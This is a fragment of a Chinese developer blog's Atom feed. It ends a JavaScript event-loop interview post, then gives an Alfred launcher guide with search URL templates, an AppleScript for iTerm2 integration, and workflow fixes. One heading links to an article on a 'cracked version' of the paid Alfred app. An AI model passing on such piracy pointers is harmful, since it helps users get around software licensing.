class=&quot;line&quot;&gt;&amp;#125;).then(function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  console.log(&amp;apos;promise2&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;console.log(&amp;apos;script end&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;纳尼？？仿佛又回想了当初被面试官支配时的恐惧了！！&lt;/p&gt;
&lt;p&gt;骚年稳住别慌，这道面试题考察的是你对Event loop事件循环的理解，当你深入了解浏览器或Node中如何处理事件循环的时候，上面此类题目对你来说就是so easy，好了话不多说让我们快速进入正题吧。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>alfred工具</title>
    <link href="http://zhoushaw.github.io/2019/03/01/other/tool/Alfred3/"/>
    <id>http://zhoushaw.github.io/2019/03/01/other/tool/Alfred3/</id>
    <published>2019-02-28T18:44:53.000Z</published>
    <updated>2019-05-26T11:54:31.189Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div><h2 id="下载破解版"><a href="#下载破解版" class="headerlink" title="下载破解版"></a>下载破解版</h2><p><a href="https://www.jianshu.com/p/5b3f98b1f7b6" target="_blank" rel="noopener">文章地址</a></p><h2 id="功能使用"><a href="#功能使用" class="headerlink" title="功能使用"></a>功能使用</h2><p><a href="https://juejin.im/post/5b0e99436fb9a009e405dbb6" target="_blank" rel="noopener">掘金地址</a></p><h2 id="web搜索设置"><a href="#web搜索设置" class="headerlink" title="web搜索设置"></a>web搜索设置</h2><ul><li>百度:<a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query}" target="_blank" rel="noopener">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query}</a></li><li>stackoverflow:<a href="http://www.stackoverflow.com/search?q={query}" target="_blank" rel="noopener">http://www.stackoverflow.com/search?q={query}</a></li><li>githubUser:<a href="https://github.com/{query}" target="_blank" rel="noopener">https://github.com/{query}</a></li><li>githubSearch:<a href="https://github.com/search?utf8=%E2%9C%93&amp;q={query}" target="_blank" rel="noopener">https://github.com/search?utf8=%E2%9C%93&amp;q={query}</a></li><li>MDN:<a href="https://developer.mozilla.org/zh-CN/search?q={query}" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/search?q={query}</a></li><li>juejin: <a href="https://juejin.im/search?query={query}" target="_blank" rel="noopener">https://juejin.im/search?query={query}</a></li></ul><h2 id="alfred集成iterm2"><a href="#alfred集成iterm2" class="headerlink" title="alfred集成iterm2"></a>alfred集成iterm2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">on alfred_script(q)</span><br><span class="line">if application &quot;iTerm&quot; is running or application &quot;iTerm&quot; is running then</span><br><span class="line">run script &quot;</span><br><span class="line">on run &#123;q&#125;</span><br><span class="line">tell application \&quot;:Applications:iTerm.app\&quot;</span><br><span class="line">activate</span><br><span class="line">try</span><br><span class="line">select first window</span><br><span class="line">set onlywindow to false</span><br><span class="line">on error</span><br><span class="line">create window with default profile</span><br><span class="line">select first window</span><br><span class="line">set onlywindow to true</span><br><span class="line">end try</span><br><span class="line">tell current session of the first window</span><br><span class="line">if onlywindow is false then</span><br><span class="line">tell split vertically with default profile</span><br><span class="line">write text q</span><br><span class="line">end tell</span><br><span class="line">end if</span><br><span class="line">end tell</span><br><span class="line">end tell</span><br><span class="line">end run</span><br><span class="line">&quot; with parameters &#123;q&#125;</span><br><span class="line">else</span><br><span class="line">run script &quot;</span><br><span class="line">on run &#123;q&#125;</span><br><span class="line">tell application \&quot;:Applications:iTerm.app\&quot;</span><br><span class="line">activate</span><br><span class="line">try</span><br><span class="line">select first window</span><br><span class="line">on error</span><br><span class="line">create window with default profile</span><br><span class="line">select first window</span><br><span class="line">end try</span><br><span class="line">tell the first window</span><br><span class="line">tell current session to write text q</span><br><span class="line">end tell</span><br><span class="line">end tell</span><br><span class="line">end run</span><br><span class="line">&quot; with parameters &#123;q&#125;</span><br><span class="line">end if</span><br><span class="line">end alfred_script</span><br></pre></td></tr></table></figure><h2 id="workflows"><a href="#workflows" class="headerlink" title="workflows"></a>workflows</h2><blockquote><p>有道</p></blockquote><p><a href="https://github.com/kaiye/workflows-youdao/" target="_blank" rel="noopener">https://github.com/kaiye/workflows-youdao/</a></p><h2 id="修复alfred工作流错误"><a href="#修复alfred工作流错误" class="headerlink" title="修复alfred工作流错误"></a>修复alfred工作流错误</h2><ul><li><p><a href="https://github.com/deanishe/alfred-fixum/releases/tag/v0.8" target="_blank" rel="noopener">fixum修复工具下载</a></p></li><li><p>导入<code>Fixum-0.8.alfredworkflow</code>修复工具</p></li><li>打开alfred快捷搜索，输入<code>fixum</code>,选择<code>fix workflows</code></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="tool" scheme="http://zhoushaw.github.io/categories/tool/"/>
    
    
      <category term="alfred" scheme="http://zhoushaw.github.io/tags/alfred/"/>
    
  </entry>
  
</feed>
